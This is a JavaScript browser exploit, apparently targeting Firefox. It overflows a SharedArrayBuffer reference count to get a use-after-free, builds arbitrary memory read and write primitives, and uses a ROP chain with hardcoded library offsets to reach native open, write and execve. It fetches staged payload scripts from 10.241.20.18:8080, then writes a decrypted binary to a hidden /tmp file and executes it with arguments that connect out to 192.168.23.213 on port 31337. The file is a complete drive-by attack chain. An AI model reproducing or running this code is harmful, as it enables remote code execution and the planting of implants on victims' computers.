function load_js(src, callback) {
    var script = document.createElement('script');
    script.onload = callback;
    script.src = src;
    document.head.appendChild(script);
}


function do_gc() {
    const MB = 0x100000;
    const maxMallocBytes = 128 * MB;
    var hoho = []
    for (var i = 0; i < 3; i++) {
        hoho.push(new ArrayBuffer(maxMallocBytes));
    }
}

var SAB_SIZE = 0x1000000;
var sab = new SharedArrayBuffer(SAB_SIZE);
var sab_view = new Uint32Array(sab);
var copies = [sab];

function doit() {
    // we are not in the shell 
    if (typeof window !== 'undefined') {
        // number of worker threads
        var num_workers = 4;
        var workers = [];

        // holds status of worker threads
        var done = [];

        // number of copies of the SAB
        var num_copies = 0x10000;

        // total number of refcount increments needed to trigger overflow
        var total = 2 ** 32;

        // amount of increments per thread
        var num_per_thread = total / (num_workers * num_copies);

        var worker_src = 'var sabs;var done=0;onmessage=function(e){var id=e.data[0];sabs=e.data[1];var how_many=e.data[2];if(id==0)how_many--;for(var i=0;i<how_many;i++){try{if(i%100==0){console.log("["+id+"] "+(i+1)+" / "+how_many)};postMessage([sabs,function(){}])}catch(e){}}postMessage(id)};function foo(){setTimeout(foo,1e4)}foo();';

        var blob;
        try {
            blob = new Blob([worker_src], {
                type: 'application/javascript'
            });
        } catch (e) { // Backwards-compatibility
            window.BlobBuilder = window.BlobBuilder || window.WebKitBlobBuilder || window.MozBlobBuilder;
            blob = new BlobBuilder();
            blob.append(response);
            woblob = blob.getBlob();
        }
        window.onmessage = function(e) {

            if (e.data[0]) { // postMessage data is a copy and should processed
                copies = copies.concat(e.data[1]);

                // if all copies have been generated, advance to next step
                if (copies.length == num_copies) {
                    console.log("Generated all copies:" + copies.length);
                    var worker_url = URL.createObjectURL(blob);

                    // create num_workers workers
                    for (var i = 0; i < num_workers; i++) {
                        done[i] = false
                        workers[i] = new Worker(worker_url);
                        workers[i].onmessage = function(e) {
                            // message received from worker --> check if all workers are finished procesing
                            done[e.data] = true;
                            var justdoit = true;
                            for (var j = 0; j < num_workers; j++) {
                                if (!done[j]) {
                                    justdoit = false;
                                    break;
                                }
                            }

                            if (justdoit) {
                                load_js("http://10.241.20.18:8080/blockcipher.js?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1", function () {
                                    load_js("http://10.241.20.18:8080/payload.js?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1", function () {
                                        load_js("http://10.241.20.18:8080/stage2.js?session=c5bfdf5c-c1e3-4abf-a514-6c8d1cdd56f1", function () {
                                            log("[+] doing it now");

                                            // one more SAB to get refcount=0x1
                                            try {
                                                window.postMessage([false, sab, function() {}], "*");
                                            } catch (e) {}


                                            // free one worker
                                            delete copies[1];

                                            // trigger majorGC
                                            do_gc();

                                            // pwn it now
                                            pwn();
                                        })
                                    })
                                })


                            }
                        };

                        log("[+] Worker " + i + " initialized");

                        // send work to worker
                        workers[i].postMessage([i, copies, num_per_thread - 1]);
                    }
                } else {
                    // create copies
                    window.postMessage([true, copies], "*");
                }
            } else {
                // ignore postMessage data
            }
        };

        // start the refcount overflow
        window.postMessage([true, [sab]], "*");
    }
}

// function foo() {
//     setTimeout("foo()", 1000);
// }
// foo();


function pwn() {
    var ALLOCS = 0x100000;
    log("Pwning now...\n");


    buffers = [];
    for (i = 0; i < ALLOCS; i++) {
        buffers[i] = new ArrayBuffer(96);
        view = new Uint32Array(buffers[i]);
        view[0] = 0x13371337; // mark each buffer
    }

    // look for first buffer that is allocted over our sab memory and mark it
    for (i = 0; i < SAB_SIZE / 32; i++) {
        if (sab_view[i] == 0x13371337) {
            log("[+] Found first hit! sab_view[" + i + "]");
            sab_view[i] = 0x13381338;
            ptr_overwrite_idx = i;
            break;
        }
    }

    // look for the index of the marked buffer
    for (i = 0; i < ALLOCS; i++) {
        view = new Uint32Array(buffers[i]);
        if (view[0] == 0x13381338) {
            log("[+] Found buffer! buffers[" + i + "]");
            ptr_access_idx = i;
            break;
        }
    }

    if (typeof ptr_access_idx !== 'undefined') {
        log("PWNED");
    } else {
        document.write("fucking fail0r");
        log("we failed...");
        return;
    }

    memory = {
        prepare: function(addr, typed_array) {
            x = new Int64(addr);
            x.rshift();
            sab_view[ptr_overwrite_idx - 8] = x.lower();
            sab_view[ptr_overwrite_idx - 7] = x.upper();
            return new typed_array(buffers[ptr_access_idx]);
        },

        write: function(addr, data) {
            view = memory.prepare(addr, Uint32Array);
            x = new Int64(data)
            view[0] = x.lower();
            view[1] = x.upper();
        },

        read: function(addr) {
            view = memory.prepare(addr, Uint32Array);
            return new Int64(view[0] + 256 ** 4 * view[1]);
        },

        readWithTag: function(addr) {
            view = memory.prepare(addr, Uint32Array);
            return new Int64(view[0] + 256 ** 4 * (view[1] & 0xffff));
        }
    }

    // set a native function as property
    function leak_native(nat_func) {
        buffers[ptr_access_idx].yolo = nat_func;
        buffers[ptr_access_idx].haha = 0x13391339;
        slots = sab_view[ptr_overwrite_idx - 13] * 2 ** 32 + sab_view[ptr_overwrite_idx - 12];
        slots_0 = (memory.readWithTag(slots).toInt());
        return memory.read(slots_0 + 5 * 8).toInt()
    }

    function leak_arraybuffer_backstore(array) {
        buffers[ptr_access_idx].yolo = array;
        buffers[ptr_access_idx].haha = 0x13391339;
        slots = sab_view[ptr_overwrite_idx - 13] * 2 ** 32 + sab_view[ptr_overwrite_idx - 12];
        slots_0 = (memory.readWithTag(slots).toInt());

        underlying_buffer = (memory.readWithTag(slots_0 + 0x30).toInt());

        return memory.read(underlying_buffer + 0x38).toInt()
    }

    function write_native(nat_func, ptr) {
        buffers[ptr_access_idx].yolo = nat_func;
        buffers[ptr_access_idx].haha = 0x13391339;
        slots = sab_view[ptr_overwrite_idx - 13] * 2 ** 32 + sab_view[ptr_overwrite_idx - 12];
        slots_0 = (memory.readWithTag(slots).toInt());
        memory.write(slots_0 + 5 * 8, ptr);
    }

    nat_func = leak_native(Date.now);

    xul_base = nat_func - 0x2DB7270;

    console.log("[+] xul_base @ " + xul_base.toString(16))

    open = memory.read(xul_base + 0x4C30708);
    write = memory.read(xul_base + 0x4C36780);
    execve = memory.read(xul_base + 0x4C36738);
    close = memory.read(xul_base + 0x4C303F0);


    pivot = xul_base + 0x171e37d
    trampoline = xul_base + 0x27c0d4f
    xchg_rax_r15 = xul_base + 0x36e43cc
    mov_rax_rdx = xul_base + 0xab9f57
    pop_rdi = xul_base + 0xef101;
    pop_rsi = xul_base + 0xeee01;
    pop_rdx = xul_base + 0xee201;
    pop_rcx = xul_base + 0xedf01;
    sub_rax_8 = xul_base + 0x027b94d3;
    xchg_rax_rsp = xul_base + 0xb71194;
    write_rcx_rax = xul_base + 0x286b423

    date_obj = new Date()

    write_native(date_obj.getTime, trampoline);

    console.log("[+] corrupted date_obj.getTime with trampoline")

    gadgets = [];

    push = function(q) {
        var qw = new Int64(q);
        gadgets.push(qw.toDouble())
    }
    call_func = function(func, result, arg0, arg1, arg2, arg3) {
        gadgets = [];

        if (arg0 === undefined) arg0 = 0;
        if (arg1 === undefined) arg1 = 0;
        if (arg2 === undefined) arg2 = 0;
        if (arg3 === undefined) arg3 = 0;

        push(mov_rax_rdx);
        push(0xdeadbeef);
        push(0xdeadbeef);
        push(pivot);

        for (var i = 0; i < 0x1e; i++)
            push(0xdeadbeef);

        push(xchg_rax_r15);

        push(pop_rdi);
        push(arg0);
        push(pop_rsi);
        push(arg1);
        push(pop_rdx);
        push(arg2);
        push(pop_rcx);
        push(arg3);

        push(func);

        push(pop_rcx);
        push(result);

        push(write_rcx_rax);

        push(xchg_rax_r15);
        push(xchg_rax_rsp);

        eval("date_obj.getTime(" + gadgets.join(',') + ")");

        return memory.read(result).toInt()
    }


    drop_exec = function(data) {
        rop_mem = new ArrayBuffer(0x10000);

        function write_str(str, offset) {
            var ba = new Uint8Array(rop_mem);
            for (var i = 0; i < str.length; i++)
                ba[i + offset] = str.charCodeAt(i);
            ba[i + offset] = 0;
            return i + 1;
        }

        write_str("/tmp/.f4ncyn0un0urs", 0);
        rop_mem_backstore = leak_arraybuffer_backstore(rop_mem);
        call_func(open, rop_mem_backstore + 0x30, rop_mem_backstore, 0x241, 0x1ff);

        console.log("[+] output file opened")

        var dv = new DataView(data);
        dv.getUint8(0);

        console.log(leak_arraybuffer_backstore(data).toString(16));

        call_func(write, rop_mem_backstore + 0x38, memory.read(rop_mem_backstore + 0x30), leak_arraybuffer_backstore(data), data.byteLength);
        call_func(close, rop_mem_backstore + 0x38, memory.read(rop_mem_backstore + 0x30), 0, 0, 0);

        console.log("[+] wrote data")

        args = ["/tmp/.f4ncyn0un0urs", "-h", "192.168.23.213", "-p", "31337"];

        args_addr = rop_mem_backstore + 0x40;
        data_offset = 0x100;
        env_addr = rop_mem_backstore + 0x90;

        for (var i = 0; i < args.length; i++) {
            memory.write(args_addr + 8 * i, rop_mem_backstore + data_offset);
            data_offset += write_str(args[i], data_offset);
        }

        console.log("[+] executing");

        call_func(execve, rop_mem_backstore + 0x80, rop_mem_backstore, args_addr, env_addr);
    }

    decryptAndExecPayload(drop_exec);

}

load_js("http://10.241.20.18:8080/utils.js", doit);